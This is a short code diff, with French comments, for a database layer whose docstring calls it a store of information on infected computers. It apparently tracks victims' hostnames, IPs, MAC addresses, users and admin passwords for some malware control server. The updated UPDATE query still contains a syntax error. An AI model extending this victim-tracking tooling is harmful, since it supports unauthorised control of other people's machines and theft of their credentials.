@@ -38,9 +38,7 @@ CREATE TABLE IF NOT EXISTS clients
 DROP_CLIENT   = 'DROP TABLE IF EXISTS clients'
 SELECT_CLIENT = 'SELECT * FROM clients'
 INSERT_CLIENT = 'INSERT INTO clients VALUES(?, ?, ?, ?, ?)'
-
-# FIXME: Pas certain comment mettre à jour une des cinqs informations pour un client spécifique
-UPDATE_CLIENT = 'UPDATE clients SET VALUES(?, ?, ?, ?, ?) WHERE id = ?'
+UPDATE_CLIENT = 'UPDATE clients SET hostname = ?, ip = ?, mac = ?, users = ?, adminPass = ?, WHERE id = ?'
 
 class Dao():
     """ Base de donnée contenant les informations des ordinnateurs infectés """
